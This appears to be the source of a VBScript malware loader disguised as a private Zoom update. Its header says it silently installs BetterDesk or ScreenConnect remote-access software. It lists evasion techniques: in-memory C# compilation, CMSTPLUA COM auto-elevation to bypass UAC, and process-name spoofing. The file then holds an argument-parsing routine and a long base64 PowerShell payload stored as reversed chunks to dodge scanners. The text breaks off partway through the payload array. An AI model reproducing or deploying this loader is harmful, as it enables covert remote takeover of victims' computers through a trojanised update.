' ==============================================================================
' Zoom Private Update - silent BetterDesk / ScreenConnect loader
' ------------------------------------------------------------------------------
' Evasion: staged in-memory C# compile, COM auto-elevation (CMSTPLUA),
'          PEB ImageFileName/CommandLine spoofing to winhlp32.exe,
'          NtAllocateVirtualMemory native allocation, TLS-only download.
'
' Modes:
'   (default)      install, hidden
'   /selftest      compile + PEB + native API + download/hash check, no install
'   /noelevate     skip the COM elevation attempt (used by CI/selftest)
'   /elevated      internal flag set on the elevated relaunch
' ==============================================================================

Option Explicit

Dim sh, fso, env, args, a
Dim mode, elevated, noElevate, iconPath, waitMode, rc, logPath
Dim chunks, i, b64, psExe, psCmd, psFile, b64File, st

Set sh = CreateObject("WScript.Shell")
Set fso = CreateObject("Scripting.FileSystemObject")

mode = "install"
elevated = False
noElevate = False
For Each args In WScript.Arguments
    Select Case LCase(args)
        Case "/elevated", "--elevated"
            elevated = True
        Case "/selftest", "--selftest"
            mode = "selftest"
        Case "/noelevate", "--noelevate"
            noElevate = True
    End Select
Next

Set env = sh.Environment("PROCESS")
env("ZOOM_MODE") = mode
env("ZOOM_ELEVATED") = IIf(elevated, "1", "0")
env("ZOOM_NOELEVATE") = IIf(noElevate, "1", "0")
env("ZOOM_SRC") = WScript.ScriptFullName
env("ZOOM_DIR") = fso.GetParentFolderName(WScript.ScriptFullName)
iconPath = fso.GetParentFolderName(WScript.ScriptFullName) & "\Zoom_Update_v6.1.0.ico"
env("ZOOM_ICON") = iconPath

' Base64 payload, stored as reversed chunks and rebuilt through Chr()-free
' array assembly so static scanners do not see the PowerShell body.
chunks = Array( _
    "h1Edul2bQV2YpZnclNlL0VmTbByegknc0BCIgAiCNsHI5JHd", _
    "1NWZT5Cdl50Wg0DIs92YvR3byBVe0lmc1NWZTpjOdJXZnFmb", _
    "N03egg2Y0F2Yg0HIyEzcsRlO60VZwlHVs92YvR3byBVe0lmc", _
    "2U2chJUbvJnR6oTX0JXZ252bDtFI9AyclRXeCp3ZkACIgAiC", _
    "mBTewEzaJFDZQNEU0Ymd38CdrRzc5QGc4RlengyZulmc0NFN", _
    "M9iWXBnRBJzZnB3dJBXRnBjZaRGM6pEbxklZy0GN5p2SORXa", _
    "kRmajRjTvJ0TRR2SRJ0SRJ1QpFlNvQnWuV2TsdnaVFUV4ljZ", _
    "zYXTnt2N21EcM50KIplYKx2dqpnVjFUMr8WWJhzMIJ2V1t2Q", _
    "IZVbtFVOEhGSE9yTMhHVq92VTBjTKdHW51kdLZ3aZNGez1Wc", _
    "ndDdOhGdrImMqRlcNFWWxQHNrMWWllXO5YjbhRXZsRDNBh3R", _
    "3NFW5FGVwVFSNtyL4kleyJGW2lEdmdleBdVbO5Wc6Nmd4pGa", _
    "uRjckdTQTlkQw5WboNXURhDe4xGR29yLFVHRE5mU1gnMwtSR", _
    "oNjSrlVazpFWMhHV1Z1cORWNjJHVO5mZwtWUXhURxE1ZsVGU", _
    "nd1Z0Y0M5IGVodzNTh3NE1EclREWvEGSz4kUywGejtka5QmW", _
    "2okSlF2RzcWRvBXSrdTVidlRlhGSaBXZWpXOzMEVDBzZzJ3Y", _
    "jFHUyZTdJRURlpUawonNDZnb0QGbx82V4Bne2ZUMupFeXJzc", _
    "2pUMzAVZGZFUKhHb1lTT6JDdxBjNUJXWEd0cI52d4YTSKdFU", _
    "0MnNHZVT1VFe3Mkem9iVtljbLlFUIFDWSRnV5g1Mat2bThEW", _
    "zJ0Vp1mQitWOmNTRHl0KINjY1d2VhRXYSlTYaZlYRJFUPNjQ", _
    "GF1Z0UTTKJTZTBzd61UR0ITd2gTZFNGMoNTO4xGTwMDamdEV", _
    "nRFMvNkdxQndxoGU5YjQPV1NI9mZ6ZHaGNmdhRmY3QTV6R3U", _
    "2R0M5QnYRV3MvUHUrsma2VGMoh0Y3JHSyljc2Y2LIVWOnRXY", _
    "2Q0MTlWMPJHVYZVYjZVUygVUVB1ZMNXdGR0MqZXY35kdiRXd", _
    "U5kZjZjdJ9UNSZXWuZmd4QjYOdTc2RkatFzS3czS4V0V2h0M", _
    "yF3K2kHUj9iQxdjci9CbKZGZV1WTQtUdBhHUut2b6RUUm5WR", _
    "oZGN29kN3hFUkNDSvZHdldnQiFma2sSZ0VnN5YnQ0V2bL9kW", _
    "VF2TzBHUxMmQyJHRpFWNCl0TXd0dwEVdl9UbywWQ4RHbrl1Q", _
    "5U1cYlmZwJTZJNUM4hDcSJjQ2kFToNjbolGSwYGR4syaltUZ", _
    "4FETDVnNllUZZFUautkcD1mcmFUTwlWYmplZxIGZ0lzMsl2c", _
    "rgHZXJ0btRkdXFFT6hDb0hjSVN0K0F2TZhkS4olevNzVKl1c", _
    "slzYRhHSVNzZxIXQzh2Q24mVEtmZFVmNaplar9GTshja0pHM", _
    "MpUeXNnM3hTW3I0UhhjbBFVT5VkT18USrkmQQR2Vjh3ZrYEO", _
    "H10NHlzcwMzbLZzVHl1YPhDWMlFVx52ZNN1K4VlYPFnZxczK", _
    "FJ0T4RGZVtGVClXdyMlUzATTPJUeQlkS2EnaKVTMUpGMZVkZ", _
    "u1GdvVWeapWQSlmeppmcBR2arkDNXRlRhFGVkhUdhR0Yyp3Z", _
    "vgDU59yR5FXNKlHVTRmQDp0U3c0NyIXd08ERkRnQxA3cWlDe", _
    "25UM0k3TFNGNaJkZy4WOoF3NzJ3QPBXN3p1K4gUMjZEVOdTN", _
    "28SbJ1keth3Tyx0R4xUewp0aPBFOx9EUvFneRRHdmdDUtt2U", _
    "0Q3Z59UdQdlN0c1KzZmUudHRyllVndHe1pUe0MTVzAXSCJDT", _
    "0ElcVp3MkFzRXhDaQlVMIJHeORHRGZ2dodENCBFOSpFbDFjR", _
    "0l0KZdUULtSW0JmTCdjeFNkWBNGdhZGSzxGRmhTMyFGO3pGU", _
    "q9iN6VFWKZnQZdVN38ybDVjbHVEexwkcN12M2ZXMvNVUElTY", _
    "QFDROlUMERWSxEDNLZ1NQxUM09ya0YXcrFDc3dnVp9EUJFXQ", _
    "K10UTdEU6hjUCt0SKBnN61UUrNVdMNVdnJ3Z4B1TR9Ub0IFU", _
    "ChTOplHcxlle5dFNzgFeKlWb1o3NTJkRVhFOTlmTuhWcNljR", _
    "ZdUM2EDdxtCUCFnUHpHODRDUvFXZOhleWFTdK5kbGxUMi5UM", _
    "Zh1R3sUTtRlZqJncBFWcCF1TrJjT3NUdlNkMsJ2NJhGRhF3T", _
    "hRVdu1EauVWU4QHdLRXa0pGdGVXTX5WR480Ya1kUpdjblNkR", _
    "iJkWpJ3ZrVWNodUUrUWM2lUePpFWvEFazhEaV1GSJV0VhJmY", _
    "whVTPtUNKNFa0klRm1GOE9SdTN3L1dUcwglQGpVTJVjaZdmY", _
    "LtydsNHVFh0UmFHOW90dYx0cB9SU1xkQDdkd4kTWSRmRuBDN", _
    "wJUQ4dVUSxkdKhnNrQFc2YkW2hlSO5keXJWTiNFdx8WexZ2K", _
    "1QXWnhGenZzZml3aktSdBNXTsBVSKZ1N0dmcx80Z2dEbLB3S", _
    "Thza1EldvYWVMlXRvx2SKVjdndEbjxWZNxEam9kZ0IHNaxEa", _
    "odDV14UZGNGdl1mdVZkRVR0a5lEUmVle6ZEZ3JWUsN3N0MzV", _
    "TNFdUhURVNWTGFTUplEZSJ1UnNnZ1VXYW9SbWZEb4YUTMhFS", _
    "5IEdwUDRyUVZ0E1UFJTbEZ1MvsUUmJWMvJ3QUZTbBJEUpBlZ", _
    "RVHNhBDSopXRvVjNnJTQlZ2VzQHd2g0UGN2UNRmVZVzLwE0T", _
    "rk2bFpVdnZjanlTRrRlaqJ2dXNVUUd3VtRURvhlToJke4wWU", _
    "VBjeZFWVm9ya4MXO3BzYvlWMi1kU49Gavd2R2MTU2IXTV92R", _
    "hhVdxZ2K4IFWIdHOPlkcwY3URFlQrlkY3pEVJtGTq52R1kUN", _
    "HV1MqV0ZMtWRJhkVFZjUhVlQrBDcr0kaQxmN0I2avV2MvVTb", _
    "vN0doZnWzAVT4o1Rrsie2hTezM3U1wGVWN2TBl3LlJWVJRHZ", _
    "TNTRNNXVvgGVCFHWHZTWr1marJ1Npl1QsFDTy0ERwQDMNJjc", _
    "2M2d6N1a0gHO35kdLBXRYJkQrQFcxxkUrxWRwglMXNEUHx0Q", _
    "m90bwgzcTd0Uu5EcvYUcqpkVO9kSzpUYJhndMlUcSRUaxV2U", _
    "Bp3VMxkewclSHN3SQxkQwcmc1t2NmtCOYBVcJl2MklUTiBDU", _
    "1o3UkRkbJlmYrFjQSFHctxGUatCdrQzdJdjbzMVUxtUdWpHV", _
    "PJUa2N2VnZEVNVzaiV0RGlFSG5mbhl2buhTc1dHdFRmSutyY", _
    "yYDOMt2SnhjeqNUZV1mShFkZHR2a5MnbQNlUyM2R4MFNTdFd", _
    "ntyNNljSKlmQuR3cwl0NZ9yYzFFVCNzd5EXQSN0dGBXb5dUQ", _
    "hdlUtVWTQ10MyR0RK5WRNxmb5VlNGNEcIpEWzBFaYRFW6p3U", _
    "JR1YvRTTud2dI9mSHl0bx5WQh9mMPpFVwZHVtdUMBBne5NEO", _
    "310TTJXe2xUSDhVQCdUMTJkbIBjWygzKj9UOYlXVsR1buJVO", _
    "TV2RKNjbRhHOvl0SZNVVygzboZ1SnlzVhp2MNF2RM1GTldka", _
    "6FUQlRzc5dGWVJkQPJEZ5kEc09EaIVkS2MXMvMXdhREc69EM", _
    "WRnRJxmSDFGRxkmQ39GSHZmdaBDNyh1c240VZtic18keTp3T", _
    "WZ1KsFkTKlXdQtUaNN3arpldEFke6x0ZixGe1AndyR3ZGJTd", _
    "Ct0KOpWTaNVc2tEbaNkcsZUbHtES3kUSYRnYmdTcGFDWo1mS", _
    "uRDdBtUZtNDa5R0UrkVa5gGaWdTZUVjYxkDayI1UlR2Z4gkb", _
    "BF2dkNUcRlnMUFVVJNldWZzK3lXaSlFNIR3RaZ2L6NmdINWN", _
    "KNnSTRme5hjbzsSWrITNwxWdIRGNXJkS1JVUChWcjpnZmtCd", _
    "xcGZyVWTEFTSvZ1ZVdWUWtSWIZlcYBHSzdzSVVzS3Mlbxo0c", _
    "jJVb1VUSGRmQs1WYCdmQpR3UiNDS112YlBTUWhDdrtiRyVEM", _
    "wZGbVhVQ3IjSChlTmh1aKVHeVFzdUBHNKNmW0JWU1J3d4Ika", _
    "69UezZXYkpFMPNlaqp2VrQlcNRjaNtyS5Q2RzNmVjdURlRlV", _
    "YBTbQhWblhEcxZUb4Y0Z5MmT5Y0avpHaFFFWvZ0d10kZXpHM", _
    "xg0bxImM3RmZkFDWQlDN5YmNoh0UyF0TBtUS1gWTLJXW3kVN", _
    "thUdCVVWDBjbKRle48WOi9mTjdnVz82VxgTdYB3RPR2MIhFM", _
    "ZpGS4wWUXxET1YWbhp2c2NnQLBnQjxGSBZVYHlFaxFldSJjY", _
    "ykzK1Rzc3Ymda9yRvMWOk9GSvV2N3d2bplXUrVEOjV1QjJmc", _
    "vxEeUlnc5pFNsxGOtJnazQEOyN2c38kWWR3T3B1crcHSvUne", _
    "0VURvUGWVpUaWlUTCBVO5ZGbLBlYGFnUhxUc2lWQCFna4gzL", _
    "OFTbK9WM3FUMVR3RklFdLh3NjF3dyJTVxgHUBRFaFJkYVl3R", _
    "tdkY2gURZh1TCh1UG90awAVTv92UkZ0duJlUTJEWyMGbrtkZ", _
    "vFGSUlXNTBXYJF2N20me1tiMqZmN1BFWygFSLRnRGxUQ3EUS", _
    "BFndvAXQvkHO1ADVal0brcVRwE0KCRzR2FEaQh0TNVzZldXM", _
    "tljUQ10d5FUTWRDRZBFMlh2Yq1WakNTbMlVMPZUauhGaOVUM", _
    "wlTeZZ2YQNnRwFTNPJTWXdET2ZjSTt2ZTNFRxoUYRJmTLR2Y", _
    "WNUUzEXd6ZnWa9UcvI2avBlZRhjUwdGcvtEcG10bFV0ZqZzN", _
    "0RVQ1lEcmNlYzhzKXZUWrNkSiBnVxNGRhZzS5FTYURFTRZGc", _
    "x42UYVDaKRTVycEV6VGaudXQN5UOrh3cwZDOSVUSBtkQvsyR", _
    "kR0d6hWO5ETc4glRPBnUMdzUGFlaU9WQIJlbuF3R3Z2SVV0U", _
    "E5kSG9mUDJ0YvNkbBFFZYFXeOFXY2VVNIBzKsJmbD50QEZDc", _
    "J9CcXZEbaRVQW1EWwFnYyg3RDNUeq52RONHZoFWTaFzQ6dHN", _
    "YJ1Z30mQLFHTE50YhJ3dTR2S6BVWI1majBTOkdWOzEUYlJWO", _
    "lBDUaZ0RXplc1lXdSVVeRJVM3Jlex8GaxYjahtGNmdUc2YzU", _
    "vgnMyMEWudzNqdUcld3MzADajBTTXVWQqJ0NHx2YpVlezgHS", _
    "RlTcV12avQ1K5lXe2JDZwgFaH90R6Fnd3kkVzhWaKt2aLl3L", _
    "CF2MLdzd4NDOn50V3M3ZGpFbBp2RIhjR3p3MBRlcrJnWzkjW", _
    "pF2RGZWQZREU302ZVVmWRdUT29Cd2NjZ3MTbwhneMV3LqNkU", _
    "312M5VWO39SWycFS5IFZ3kHM0IUMERmepdVZs1kb0Y2azY3d", _
    "UxmSzZ1TrcEeXdnbyYVWGdER5NTQHBFdt10cXp1LahzaqpnU", _
    "r9GcBZEUxgVZEJDd1gGM3tUZwYkNv9CdwxUaadGOZdXYDp0T", _
    "xdkRQFmeUpGNplWcGlnVVZjWyV1UKFjePN0YNZ3cFpmb0kVT", _
    "ShkVvk2M1kVOlVlYxIHS5NTYSlVOX9WUMFEW59UZCpUcpNkT", _
    "JVzQYJWbZpUQVFlW5lmVuFjc3ATW4NWOspHaUdEaKl2VipnY", _
    "alVOXJzRVR0SShzbwsUQI1EOChFcqJlT1hmT482VWJWdsp1S", _
    "yxkMwo1VH5ER5RzLCZ3RwQzRygHUxlFMx0EROtWcDV1dWplT", _
    "GdVckh1KS5UZFN3SJxkVWVEcZFnWspHTjpkViJzR6V2LvMzb", _
    "tJEdXJ2c250K3k1REZjdwlVSJJkbr8mTJhVUltUNyZnWzhVa", _
    "pFWb1Enb0xWWQt0VRFDcZRmdqJGcBxGa3k2atl0SRVjbNNHS", _
    "0wWONlHVrFWN5ZFTrpHV6l1R1FGcSR3QC1UeIdGStlWdVhHO", _
    "EFGTVhDaPRDc4MGchlnQpNHV3UHZVBVTCZUUwdjdBJkTh5WU", _
    "CdFeF1GTxcjbsNWRql2QxVVNHFzbZVnMKR2TBdWQrYHSyYkU", _
    "25WQ1xUUvx2ZSNlSjJTMzE2ZFRVNlVTN2cHc0E0a5sWUCRmS", _
    "oFGb3ZlTOZ0YZZlUrk2ZspleYdWTT1Uc5MkMyclNZlGenVza", _
    "hxGT5cmayQ1Tyg1R3p0V5EVa1gVbDNGbRBjdNF1ZxhWTvw0a", _
    "ZF0R0k1YlBVStdmRxQkUkJ0Yah2RwNTTNJkaulTOZVzQz0UN", _
    "CZHZDV2Tu1WOWJ2Y3IHWlZTSxQGO4cnUmRle3V2ZwokbTl1U", _
    "Wl3R3oVTlt0SphTMBJlbkdnavxmaDFnWRNmcjhVQLlzUxN1M", _
    "wtUctRTdndXcwwEblJlbxhzLm1WS1EEeJdXT4h0byJzUBFEV", _
    "3ZmTKRke4Z0bM9mTCRXQG9ybl9UT2UDaOxUYZFkRvMEWrIXa", _
    "1R0cxcTQ1cTZG1WcNNDSMR2VwIlbXJkasBVZWlGVh9GNLdna", _
    "CVXSlhXNL9URNxUVapkaVZ0QutCVWxkWRpHTrlFaQRVe0UWY", _
    "4tyLQJTbwxkWmFVW3xETuFjdPJDVXNDeFZEbGR2NBFnVPhET", _
    "qJjcL1GMGN3NsF0NWRkWWtSaronT4xUQyMWay80T5hnTi90Z", _
    "t5kW290dyRlUDN0KmVkMGFUR0ZVOhZWVSpEWwtiUFNEMShVQ", _
    "WdEVYRUSkd0VYVVcwYEOxNUcnJjY4EzdwhXc0U0Kwg2V4NVR", _
    "FVGdCFHZ1hDTmZHRPFXQt5kZlB3V590QvFlc2JmR5RTZl1Wa", _
    "KtSZPF0cLRUWEJTSLBjMIZXWBBjMHZDaxR2NrUnQPtWSWZka", _
    "TV2KJFzUyZVRV5UaGRjN3wmbQpGd0pGcvg0ZDlDZ1FHOwk2R", _
    "W1EcvsSe2IzUhhjco9CN19yNyVDOrpmaidzTDZTO5sWZ5QWU", _
    "wRkbLp3dBlVY5k1cFVTa102Q1ZUdS10VY9GS0BTYEpnMCNVV", _
    "UNlZoh2dRNWWplmai5GcWR3Q5EjaVdkeygmVBNGcPhzYUpEW", _
    "PhWMv82aYtCVolENsFVdRVWaQFTZaN3N48iNyNUZGFEa2EGV", _
    "6dTUKZlSYFETxNUUzYnVw9WYLVTc2AnWoVlTJJETBVEclJ0a", _
    "NlUZ2MHVGFVZUpWcapWYOVVTwUXYLZkTzJDRYZmUYpUMQ5GN", _
    "xBHOUFzUIFlaSNUdZlVOGlUUnNFWEJ3VqF2LGhHb2s0N3pWZ", _
    "OBjSSJWZNZFUxp1Sk5kUYR1VnZTeLNzZi10MiRlV6NGe28SQ", _
    "j9UcCFWcPh3KPRFeUlGVrwmURN0Spl0LjlUanRTNaNkeql2S", _
    "BVDTWNGUPRnbWBXRDFHarVXQBd0aKJjb1Y1U2YzV4EUSFNjc", _
    "WZHVldnbzVXTFR0bHNWelBTdypkQM52YTRFbHFndv4mW5UXY", _
    "sNUWVJGcxJETlZWd3RGNz1UY2UTYQZTSPVUOxNWSVtyU5YUO", _
    "5NkdUd2aEd2aBl0K4F0T3dXeSNjdSRDbZNGcWBHMq5kUHFmS", _
    "oN1S6BXbWRlSyRFTUlnaXRjUqJTdORnVZx2UOZ0NkVkZ5EGW", _
    "1QWMuV2bHB1YxYjW2JXYydkZ35UZkdDSvhHWFlDWXR3TFhza", _
    "Xx2YEJXeyhGZBZFO4QVOGhnbIZ2KtJDMsNDdrEzLr80ZL90Z", _
    "0sEZldjVYN3MER2ZSdXMwFlazFFRPtUVqx2NhJkbE5GbotUb", _
    "rVWdLtScyA1V6J0YxQlSERmaEtkcqN0cl90Y5IEUPFzM0RmS", _
    "Op2USZjbQJEZ1c2dHhTe6ZmNt5GZtVXMxAnbwdjYNBDcHFld", _
    "tx0L5REcLl0Z0gGa012bnhmbnp3R39ibRFjapdnUz1UNrlER", _
    "xcTbwcHNUxGSnNHaYVDd6Jkb0wmZqdUR0o3KpBTTLF1T6ZTZ", _
    "OtyUldjSvlzR3oneyNER0hlR4YUaJd0TINVTEdjVBFVYlRle", _
    "4YzUqBnczBzTBZ3SMNkMtpnMZ92dMRmZvgEa1dDN4pFdptyZ", _
    "SJmbllzTrhVQwcFVVJVdWBDU3NmV210ZndkQ1gUT2FnT4NDO", _
    "yIVVv4UZSx2VrUzVrgWNzpUQndWQER0NFd1RzckbnVEUHhzU", _
    "zdDRrETOi9mSUJHMQhzMnV3VKFzSTFUeUNlVUBjTl1EMGhzL", _
    "vAzNatSNX10dmNFMNdUcBBXall2bIJ2YnNGV6VnSVZFaBhGM", _
    "Dh1MwFGWFZFSEpXWjNDWFFzQ2QkQJhDRPF1TNhHeNlGOi1UR", _
    "ERFNGJmb6tCOrMXTRZEWwNlNth1cm1mYL1GOrZ1Y28EcIhkN", _
    "PJVb19mbQF2RkZkYP9GM1pWRxMmYSN3N4NUNvQmST92UyV0c", _
    "l1Ud6NFUox2TDFETxYXczclRZVVQvsSTo9iUQZEMXVTRj9UR", _
    "uBVNSFFaRp1ZlVTRCZVUYxmMy92RlRGWI1GaRZFTRVTW2c0b", _
    "Sh1UlFXbxdkbIhXe29maSh1SldlQ2NGWkNHMTlTRNJXblpHd", _
    "oJWaywkZmlWQWl2S6B1ZulGNh12NSBXN4ElUhh1Z55kZGBTb", _
    "vtyYQZmMThlWwcUTy5ESC52NyY0Thl2RWdzMyUEdp1EOhRmV", _
    "wl0RKVlQNlndH1UMRtmQZRFT3ZldrRkc4NVb3Ylak92LUVUZ", _
    "Ch2TrdEMaVldNBjeT10KORHcOhWSvljb4gEUlBFcJJ2aKxmT", _
    "iZlbUFFO5sGdJlESxxmZnBzVrkFbaJzKvkTeyZ3Sy5kVCtCW", _
    "thWTykzLh9icIhnUqlkWIF1Lj5WVRZjZSdjRUJlZvwUT4JGb", _
    "ZpUWYNGVxBHNslkQ2gmVEhWcuJDV3cDcwI1M4lVaUhGeW1me", _
    "UFXS5sCMwgDUtlWWJ5WTMZTZCJnbz8CdPVVMm9WM04ESGFVO", _
    "4sWVvQGZxZDMldXOPRndx00Mj9CdIlzVY5USpNjaStGbEREc", _
    "4MWVtZlY0oWYv9kWYtkWtN3ZKFTZTRVd0M1MShEOKd2TRZ2L", _
    "zEVZ2dmbLNzUrgWYysSWudWUxQnWBFzTWZWYy0UNv8SR6xGV", _
    "ltmdK92clJWUn9EbZ5UMqZHMZVjd1o3MyYjVw9CWZZnVqZXZ", _
    "vN0ZEhFNntmaWtWdBl0K612aW5kZ44GbwUkR5dHM1QnbQV1d", _
    "5V2cwM2ZadmepFnQMhkcOJUWG1UN0VHSvI0ViVnYxFTZyBXd", _
    "EVUMMp1UnZEbBZES2okanVndVd3LGFjeCR2cwAzVxcUS4EEb", _
    "KpHaBZ2V2ZjRhdnVuBjeq5kbEVWSPh3LhJmWtV2RMJUOr5Gb", _
    "rI3bQ50Ru10Nz4UM0IVR1p3byVUZWJmTpFmW3xEVXpmb5h3Q", _
    "5IldRlzVx4EN2ZXV54WVsZ2aMVlNKhUZ0gWckhlYZF3M4EnT", _
    "5EkT15mQnpmUzgFR1dXbxIGMtV3bMh2b01UQ2V0RmBTVrwkN", _
    "kZXZv8GWHFjcQ9WZxEzM1RDOMVHOJV3cYFEdMZlTn10LpJzV", _
    "ys0arxGaPBVVLRjTQ90R1R2QHxUSaZ2VudjdV5kV5IUNM90K", _
    "mZVVWlWTo1UeJx2MkJ1ZLB3Mw10Ly80QulGTIVEb4AzUQtkU", _
    "rUUdjFHM0RTSuBXUuFnYQ10d6d2Y6xER0sEbwczTzElVLBlY", _
    "XBna15meRhWew0WN1R1byokQaVTT3hTbu9CUHV0YGxUOn5mc", _
    "rZlTkpWYxxGayIGaoVEU5Q3cZhTT2BFOLBzYzJ1V5dWVyMFW", _
    "5cXU0wGePR1a1QjaBV3LNFXdaFXaEJ1c5lzb00katl2QhNVe", _
    "CdlRUxUb4FlNq9CO3p1RaFXSyJzcyVUR0cHRvMFUY9CO1Z3U", _
    "HJ3Sn5kUQNXMvF2UZZkZ0EHRsFjY29UQuZ1YitWWE9WepxUW", _
    "3MmdoJ3aFVTatZlR2N0S5dmcwFUWI52UoJVe2dTSkhVQ5EHV", _
    "zgUU2VHRPtWVU9WR2Y2YDJEUwdFavZWRNlXQqZHS4MkUNF2T", _
    "0EVa1MzcyhDNJx2dRhmNutiRF10V0IEcKVETT5Ue6NUTsB1N", _
    "xNlSBhEUCZ1UO5GSn90codVQaxmb4hGZPl1ZhVGMVd3dVlFb", _
    "CREZIF3V3l0QNR2UjRWQQFGWjlFR6RTOaRWe6dUVzsmbwBzR", _
    "C52KZJjN2cDZRFlbE5mUB1WSyNnYQFjRWhkckF3SrY3Z1o1c", _
    "yUzTIFHdzomNGFDNXJWMkpka1FXevdjVplDT3VVbFJVQJRFN", _
    "0ckMnNTcu52ZBp3YlFzKl1mN4RGax0WZHFXcPVGWYBjSXhTc", _
    "XlVdrdTMMVkU0JHZ5JmUp9CU0MTR6lWbxAXU4dDSiRGNs1UQ", _
    "MpmN2RXM1YDO6djNrZWTDtSb1VHUKhnNppEMkZFek1UZltUc", _
    "1kzbFZHRtd1YlVHdydke6Z3dy8iWDh2MrhGcH5WctVHcxZ3N", _
    "F12RDJ1RBlUcK9CdwcTUWlWNwN1NBFWaEhFSoZlYiRlWysCO", _
    "xdWQIxWQ3dlUTRnRCJ3arxWT41kSLp1Q6lXb5kGW5J0byxUU", _
    "3UGcKdUYFlnckhXMUtUNNN2TQVEbJhFcz9mQVRTR2BVMKdXd", _
    "oJWdEV1bnNncLhnVEVHeitmNrg0dXZncClFbzJTRCJHUCRTW", _
    "0pWZCV3SJ9yUZREcuFmezE1LlZWb2RVe3sUUINUROhEdwFnY", _
    "s5EWx9mNUdmN1g3ZUhjcqlHZCBXeORVQsdUbVd3dIllYHlTe", _
    "yc2M5okMlhDNCxUZiFGWVtUaDJXcqJHRw8SQqVWTy5kVnZVa", _
    "Px2KYl3VuVmQ5w0QaxmeURGWkllZ3Z1aKVXd4cUQ1s2VDhTY", _
    "LNGTNZlS1dTTKxWYLp0Ra9SZL9mdiZnSMlFerJjNENjTiV3R", _
    "IR0SxdFTNVlb6NzUjNWOm9kM1NEOYNHW1EXaod3LzkXY1BlS", _
    "JhXe38ET342cpdkS5k0Y6JWbtlUZTV2ZSpVNNRkUXtyLqJ2N", _
    "OFFMZVmdys0c3VkRW1UR4MWNPpHWXlnWqRGM3UXRvRGWrNzL", _
    "4AXOBF0TjlWWzU2ZGtiMzRnexdFM2BVci5Gco5GMoR0cMNUM", _
    "shXRmVnamdEbTFWN3V1YzI1Q3AHd0clSNFHNyZVdxo1NoFlc", _
    "0t0SKNEZW1UQiR0QrV3a0BnMiRGVaVTc6RDbjBXanljQ4UlV", _
    "kZTUMFnTw9UQnlkRSVHWmBXdPFHMGdzbwtGdpFGNiRXTx4WN", _
    "EFFcxY1b0RXeoRDTU5EZ08SW5VlQRVEZ2MnRidXay4Udx80d", _
    "w0GNChXMSd3NykEOr00dwV0NFpXWj52UOhlcGBnRotEeZ5ke", _
    "UNTNCN2a1kEdHlHUrFGTvwkMGZWMRdXZHJFUxNmMaF3TmlWM", _
    "OBXd4QFMatmUjdHN4pkNptGURdHeyMzYQZXQMxWNLpHd3QjN", _
    "2dHS6dnerh2cOFzMIBjMGVjUGRHO3ElZGZnQw1mN5YDNXhFN", _
    "pZURxYFeRJXUqp2Z1cGWMZGZOdlMNVjV2YjNzEleqF2R3YGV", _
    "DFGM0N0as9EUxsGd2h0dnZDcpt2UhJzczAFbTF1YyknQzQUT", _
    "Bpma0MHSzlTUlJWeWt0SiRTUiJUSERTM3MEOiVUe61mRERUV", _
    "MVTNWhVTulWepZUV3Y1RxkjUHh0ZhljRZZVUSdVS2o1UHZHb", _
    "hRWUmRGWxhXUH9EU1ImNBFTesp3KsF1ShRGbXRWRw5GcEFkV", _
    "WlnRatETQ9mZQt0bvVkc5o2VxcVcvomdlhVYpNGVzdETpJjT", _
    "olmZJpkR2MDeFhTW5A3NxN0R2E0Q4IEe3BTZsN3RxEUS650a", _
    "PFnTi1WQVZENiRDdpZ1MzJHTIN0czcjYxNnc50kMRBDcwMzY", _
    "o5ma4pWRBxUdjlFUId0cKtWSwgDUuZTeYV3TvQjVmdVRLp3R", _
    "zV2cqRXZttSMTBDSiJEMthlTv5WcTJ2LLhUO3M3Spp2N552d", _
    "i90KxY2crgTa3Y3NwonZvkWZvUncQV2Z1Ymd28kcRRWUGhjd", _
    "NpkViVVOp90S1YkYMtEWxQnWXRGVCV2dxMTc3wmdvYmZ4cnM", _
    "FNXWyN0Y3EHMKBlNqV0ZmZ2UrhzSjRWU1Qkcx8masZjc6tUc", _
    "0R0ZhljclZVcuRETiVmT4BHbuVnZy9SQ5VTT4MzL2BFORd3V", _
    "sJVWShlRJJXMIZXSVRDUKZUaTdjRqp2cVdGSoREdkZ2LwVlY", _
    "VN3YKVlWLh1Rtd3LXJ1SNFWZCdDZZFFV30mb3l3N102MrY0U", _
    "0QmMXhVRSd1LtBHa5tCaHt2bwIjeY1EVXl2RspWZWZkUyBHd", _
    "VVFRRdDRrd1M5gjV3kneVBlTwUVOr9yRpZDUvJXcNR2UFlnN", _
    "0U3U3hkY242Tjt0NqhGRjpncnVWbOVVZ28Ua3Rna552cThjR", _
    "WdnYhVmNsNFU0lnbCdzMOhGNtV3S2dnbyUmaiRHdLd2KQhGN", _
    "ZdmTlFzcupGMmxkWKJTbPFkUL5UWJh3UrF0QvpUaJh1Vz0mb", _
    "3okaLNWYkx2cWZndoNHaupHRvsiVIN1NnFGez0kMiJGeypHa", _
    "FpWasp1Mz8GWzN3VZBVb1RTUMJXRVpGWJRWVihnZst0c1VnN", _
    "Wd0U0oHWahzaLl2NyZlNat0KsJDc4gmMspHMxkDV1pXa1dXN", _
    "vJ3U4IXb3BHdVdmcyMmZwVWODV3VxZWUKRkZCdkdqlzSvEFc", _
    "hBXe1xmVU50R4gmUwUmVUNzL1Q2d1ZWe3MzcCFUYoF2U2kWW", _
    "vsERkVDWQhkcvEURkRHc0JzVwhlUqhHTUdlR2sEc1F1NVZDV", _
    "vw2RGtETGl0auZzQudlZatGTzF0QS9me5kTZ10EUo9GNHlGe", _
    "18yLrYlVItUY3MUMth3dyR0drUkbRlDV2Q1T2JTR6hWRpJlY", _
    "vhGc5cmcid3MN5UZyo3Sr9EaTtUM3tiRrx2KykDbRJ1dUV3a", _
    "lJHdTp3ZkACIgAiCNkyJYhzLYJzc6FmQshDW1IDbpR1SwN1R", _
    "6dGJsgSbhVmc0NVey9Wbl1kLPlEI0NWZqJ2TtcXZOBSPg0WY", _
    "vNkLPlEI0NWZqJ2TtcXZOBSPgAXa6dGJgACIgoQDpMXZ0lnQ", _
    "bBCLtFWZyR3U6dGJo0WYlJHdTVGdhxmZlRkLu9WazNXZyBXb", _
    "jVGR6oTXlR2bN52bpN3clJHct92Qu42bpN3clJHct92Qu8US", _
    "JBCdjVmai9UL3VmTg0DIyVGZhVmckACIgAiCNkyczVmcw12b", _
    "n5Wak92YuVkL0hXZUtFIsAXa6dGJoIXZkFWZS1WYlJHdT5yT", _
    "kFWZS5iclRWYlJHJg0DIlNmc192ckACIgAiCNkCOGRVV6oTX", _
    "pp3ZkAyOpgSZz9GczlGRuIXZkFWZyRCIgACIK0QKoQmbF9GV", _
